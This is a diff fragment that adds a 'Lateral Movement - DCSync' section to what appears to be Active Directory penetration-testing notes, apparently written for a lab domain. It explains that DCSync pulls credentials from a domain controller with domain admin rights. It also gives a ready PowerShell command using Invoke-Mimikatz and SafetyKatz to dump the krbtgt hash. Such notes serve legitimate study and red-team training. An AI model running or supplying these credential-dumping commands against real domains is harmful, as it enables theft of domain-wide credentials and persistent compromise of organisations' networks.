@@ -507,3 +507,10 @@ $ Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createneton
 ## **Lateral Movement - DCSync**
 
 
+- To extract credentials from the DC without code execution on it, we can use DCSync.
+- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
+
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"' SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+```
